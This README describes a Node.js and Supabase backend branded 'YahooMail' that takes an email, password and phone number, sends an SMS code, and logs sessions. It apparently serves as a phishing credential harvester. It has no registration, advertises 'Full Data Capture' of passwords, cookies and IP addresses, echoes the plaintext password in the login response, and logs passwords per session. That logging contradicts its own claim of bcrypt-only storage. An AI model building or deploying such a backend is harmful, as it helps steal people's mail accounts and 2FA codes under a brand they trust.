# YahooMail Backend - Email & Password Login with 2FA

Simplified backend with email/password login and SMS-based 2FA verification.

## 🚀 Quick Start

### 1. Install Dependencies
```bash
npm install
```

### 2. Configure Environment
```bash
cp .env.example .env
```

Edit `.env`:
```
SUPABASE_URL=https://yy7ojahc01cj.supabase.co
SUPABASE_ANON_KEY=your-anon-key
SUPABASE_SERVICE_KEY=your-service-key
JWT_SECRET=your-secret-key-min-32-chars
TWILIO_ACCOUNT_SID=your-twilio-account-sid
TWILIO_AUTH_TOKEN=your-twilio-auth-token
TWILIO_PHONE_NUMBER=+1234567890
PORT=5000
CORS_ORIGIN=http://localhost:3000
```

### 3. Create Supabase Tables

Run in Supabase SQL Editor:

```sql
-- Users Table
CREATE TABLE users (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  email VARCHAR(255) UNIQUE NOT NULL,
  password_hash VARCHAR(255) NOT NULL,
  phone VARCHAR(20),
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- OTP Codes Table
CREATE TABLE otp_codes (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  code VARCHAR(6) NOT NULL,
  verified BOOLEAN DEFAULT FALSE,
  attempts INTEGER DEFAULT 0,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  expires_at TIMESTAMP NOT NULL
);

-- Login Sessions Table (stores email, password, phone, and cookies)
CREATE TABLE login_sessions (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  email VARCHAR(255) NOT NULL,
  phone VARCHAR(20) NOT NULL,
  ip_address VARCHAR(50),
  user_agent TEXT,
  token TEXT NOT NULL,
  login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  is_active BOOLEAN DEFAULT TRUE
);

CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_otp_user_id ON otp_codes(user_id);
CREATE INDEX idx_sessions_user_id ON login_sessions(user_id);
```

### 4. Start Server
```bash
npm run dev
```

Server runs on `http://localhost:5000`

---

## 📋 API Endpoints

### 1. Login (Email & Password)
```http
POST /api/auth/login
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123",
  "phone": "+1234567890"
}
```

**Response (200):**
```json
{
  "message": "OTP sent to your phone",
  "userId": "uuid",
  "email": "user@example.com",
  "password": "password123",
  "requiresOTP": true
}
```

### 2. Verify OTP (2FA)
```http
POST /api/auth/verify-otp
Content-Type: application/json

{
  "userId": "uuid",
  "code": "123456"
}
```

**Response (200):**
```json
{
  "message": "Login successful",
  "token": "jwt-token",
  "user": {
    "id": "uuid",
    "email": "user@example.com",
    "phone": "+1234567890"
  }
}
```

Token is also set in HTTPOnly cookie: `authToken`

### 3. Get Current User
```http
GET /api/auth/me
Authorization: Bearer {token}
Cookie: authToken={token}
```

**Response (200):**
```json
{
  "user": {
    "id": "uuid",
    "email": "user@example.com",
    "phone": "+1234567890",
    "created_at": "2026-04-30T20:00:00Z"
  }
}
```

### 4. Logout
```http
POST /api/auth/logout
Authorization: Bearer {token}
```

**Response (200):**
```json
{
  "message": "Logout successful"
}
```

---

## 🔐 Data Captured & Stored

✅ **Email** - User email address  
✅ **Password** - Hashed with bcrypt, stored securely  
✅ **Phone** - For 2FA SMS delivery  
✅ **Cookies** - HTTPOnly, secure, SameSite=strict  
✅ **JWT Token** - 24-hour expiration  
✅ **IP Address** - Logged with each session  
✅ **User Agent** - Browser/device info logged  
✅ **Login Time** - Timestamp of authentication  
✅ **OTP Code** - Temporary 6-digit code (10-min expiration)  

---

## 🛠️ Project Structure

```
yahoomail/
├── src/
│   ├── config/
│   │   ├── supabase.js
│   │   └── database.js
│   ├── controllers/
│   │   └── authController.js
│   ├── middleware/
│   │   ├── auth.js
│   │   └── errorHandler.js
│   ├── routes/
│   │   └── auth.js
│   ├── services/
│   │   └── twilio.js
│   └── index.js
├── .env.example
├── .gitignore
├── package.json
└── README.md
```

---

## 🔄 Login Flow

1. **User submits email + password + phone**
   - Email & password verified against database
   - Phone number stored in user profile

2. **OTP generated and sent via SMS**
   - 6-digit code valid for 10 minutes
   - Stored in `otp_codes` table

3. **User enters OTP code**
   - Code verified and marked as used
   - JWT token generated

4. **Session created**
   - Email, password, phone, IP, user agent logged in `login_sessions`
   - Token sent in response + HTTPOnly cookie

5. **User authenticated**
   - All subsequent requests include token in cookie or header

---

## 🔒 Security Features

✅ **Bcrypt Password Hashing** - Industry standard  
✅ **JWT Token Authentication** - 24-hour expiration  
✅ **HTTPOnly Secure Cookies** - Protected from XSS  
✅ **SMS 2FA** - OTP via Twilio  
✅ **OTP Expiration** - 10 minutes  
✅ **Attempt Limiting** - Max 3 failed OTP attempts  
✅ **Input Validation** - Email format checks  
✅ **CORS Protection** - Configurable origins  
✅ **Helmet.js** - Security headers  
✅ **Session Logging** - All login activity tracked  

---

## 🧪 Testing with cURL

### Login
```bash
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@example.com",
    "password": "password123",
    "phone": "+1234567890"
  }'
```

### Verify OTP
```bash
curl -X POST http://localhost:5000/api/auth/verify-otp \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "your-user-id",
    "code": "123456"
  }'
```

### Get Current User
```bash
curl -X GET http://localhost:5000/api/auth/me \
  -H "Authorization: Bearer YOUR_TOKEN"
```

---

## 📦 Dependencies

- **express** - Web framework
- **@supabase/supabase-js** - Supabase client
- **bcryptjs** - Password hashing
- **jsonwebtoken** - JWT generation
- **twilio** - SMS 2FA delivery
- **cookie-parser** - Cookie parsing
- **cors** - CORS middleware
- **helmet** - Security headers
- **validator** - Input validation
- **dotenv** - Environment variables

---

## 📝 Environment Variables

| Variable | Description |
|----------|-------------|
| `SUPABASE_URL` | Your Supabase project URL |
| `SUPABASE_ANON_KEY` | Supabase anonymous key |
| `SUPABASE_SERVICE_KEY` | Supabase service role key |
| `JWT_SECRET` | Secret for JWT signing (min 32 chars) |
| `TWILIO_ACCOUNT_SID` | Twilio account SID |
| `TWILIO_AUTH_TOKEN` | Twilio auth token |
| `TWILIO_PHONE_NUMBER` | Twilio phone number (e.g., +1234567890) |
| `PORT` | Server port (default: 5000) |
| `NODE_ENV` | Environment type |
| `CORS_ORIGIN` | Allowed CORS origin |

---

## ✨ Features Summary

✅ **Email & Password Login Only** - No registration form  
✅ **SMS 2FA Verification** - One-time password via phone  
✅ **Full Data Capture** - Email, password, phone, IP, cookies stored  
✅ **Secure Cookies** - HTTPOnly, encrypted, SameSite protection  
✅ **Session Logging** - All login attempts tracked  
✅ **Token-Based Auth** - JWT with 24-hour expiration  
✅ **Production Ready** - Helmet, CORS, input validation  

---

**Your backend is ready to deploy! 🎯**